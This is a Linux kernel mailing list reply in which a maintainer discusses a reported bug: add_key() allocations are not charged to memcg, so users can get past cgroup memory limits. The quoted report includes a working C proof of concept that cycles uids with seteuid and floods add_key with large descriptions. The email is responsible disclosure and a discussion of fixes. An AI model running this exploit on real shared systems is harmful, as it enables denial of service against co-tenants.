From: Michal Hocko <mhocko-IBi9RG/b67k@public.gmane.org>
Subject: Re: add_key() syscall can lead to bypassing memcg limits
Date: Mon, 29 Mar 2021 09:39:42 +0200
Message-ID: <YGGEPrYCDmSCjuun@dhcp22.suse.cz>
References: <7d222142.1e89e.17876ab335a.Coremail.ytyang@zju.edu.cn>
Mime-Version: 1.0
Content-Transfer-Encoding: 8bit
Return-path: <cgroups-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.com; s=susede1;
        t=1617003584; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
         mime-version:mime-version:content-type:content-type:
         content-transfer-encoding:content-transfer-encoding:
         in-reply-to:in-reply-to:references:references;
        bh=Awe1edIW7HAOiUt+RBmLfJWuVVokUbchDFh5Qge6oI8=;
        b=NUKM6iFAgfWtvIpxM1eVye/CaKKOmtbFhRt+GxNMj3mSSxxJ6JwxzDx+HN7S3qY0VIp5M7
        cfYqWae/+dJlrfwmYmTkc5g6O9SH0aExLdx7dkvk7SJBnIzJJ54i9px7+cOiRUsNF7sjGO
        CWpItdr5zzVGHzFTyeb6mZok62wNRWM=
Content-Disposition: inline
In-Reply-To: <7d222142.1e89e.17876ab335a.Coremail.ytyang-Y5EWUtBUdg4nDS1+zs4M5A@public.gmane.org>
List-ID: <cgroups.vger.kernel.org>
Content-Type: text/plain; charset="utf-8"
To: =?utf-8?B?5p2o5pix5aSp?= <ytyang-Y5EWUtBUdg4nDS1+zs4M5A@public.gmane.org>
Cc: hannes-druUgvl0LCNAfugRpC6u6w@public.gmane.org, vdavydov.dev-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org, cgroups-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-mm-Bw31MaZKKs3YtjvyW6yDsg@public.gmane.org, shenwenbosmile-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org, David Howells <dhowells-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Jarkko Sakkinen <jarkko-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, James Morris <jmorris-gx6/JNMH7DfYtjvyW6yDsg@public.gmane.org>, "Serge E. Hallyn" <serge-A9i7LUbDfNHQT0dZR+AlfA@public.gmane.org>, keyrings-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-security-module-u79uwXL29TY76Z2rM5mHXA@public.gmane.org

Cc keyctl maintainers

On Sun 28-03-21 10:30:34, 杨昱天 wrote:
> Hi, our team has found a bug in key_alloc() on Linux kernel v5.10.19, which leads to bypassing memcg limits.
> The bug is caused by the code snippets listed below:
> 
> /*--------------- key.c --------------------*/
> ...
> 276/* allocate and initialise the key and its description */
> 277key = kmem_cache_zalloc(key_jar, GFP_KERNEL);
> 278if (!key)
> 279goto no_memory_2;
> ...
> /*---------------- end ---------------------*/
> 
> /*------------- keyctl.c -------------------*/
> ...
> 95  if (_description) {
> 96description = strndup_user(_description, KEY_MAX_DESC_SIZE);
> 97if (IS_ERR(description)) {
> ...
> /*--------------- end ---------------------*/
> 
> Each user can allocate ~20KB uncharged memory by calling add_key syscall to trigger the listed code.
> Code at line 277 in the first snippet allocates a new struct key object that is not charged by memcg, as no accouting flag is passed to neither the
> allocation site here nor the key_jar's creating site. At line 96 in the second snippet, we found that memory used by description of a key, 
> which has a maximum size of 4096 bytes, is also not charged. A user can allocate multiple keys and consume more uncharged memory. 
> The upper limit of key memory's size is set to 20,000 bytes by default for each user.
> 
> The bug can cause severe memcg limit bypassing if a process can change its uid and bypass the above limit. For example, a user may own root privilege 
> in its user namespace and leverage seteuid() syscall to continuously change its uid. 
> Our evaluation on QEMU v5.1.0 + cgroup v2 shows that, under this assumption, we could consume ~2.2G memory by allocating keys from 100,000 different uids, while the memory charged by memcg is ~215MB.

Can the user/attacker create all those different uids? Or what would be
a typical scenario where this a threat? In other words is this a
practical attack vector?

If yes then the mitigation woulld be quite easy for the key_jar (just
add __GFP_ACCOUNT). I am not aware we would have strndup_user
alternative with kemecg enabled so this would have to be added.

> 
> The PoC code is listed below:
> 
> /*--------------- PoC --------------------*/
> #include <asm/unistd.h>
> #include <linux/keyctl.h>
> #include <unistd.h>
> #include <stdio.h>
> #include <string.h>
> #include <stdlib.h>
> #include <time.h>
> 
> char desc[4000];
> void alloc_key_user(int id) {
>   int i = 0, times = -1;
>   __s32 serial = 0;
>   int res_uid = seteuid(id);
>   if (res_uid == 0)
>     printf("uid allocation success on id %d!\n", id);
>   else {
>     printf("uid allocation failed on id %d!\n", id);
>     return;
>   }
>   srand(time(0));
>   while (serial != 0xffffffff) {
>     ++times;
>     for (i = 0; i < 3900; ++i)
>       desc[i] = rand()%255 + 1;
>     desc[i] = '\0';
>     serial = syscall(__NR_add_key, "user", desc, "payload",
>       strlen("payload"), KEY_SPEC_SESSION_KEYRING);
>   }
>   printf("allocation happened %d times.\n", times);
>   seteuid(0);
> }
> 
> int main() {
>   int loop_times = 0;
>   int start_uid = 0;
>   scanf("%d %d", &start_uid, &loop_times);
>   for (int i = 0; i < loop_times; ++i) {
>     alloc_key_user(i+start_uid);
>   }
>   return 0;
> }
> 
> /*-------------PoC end ---------------------*/
> 
> Thanks!
> 
> Best regards,
> Yutian Yang

-- 
Michal Hocko
SUSE Labs
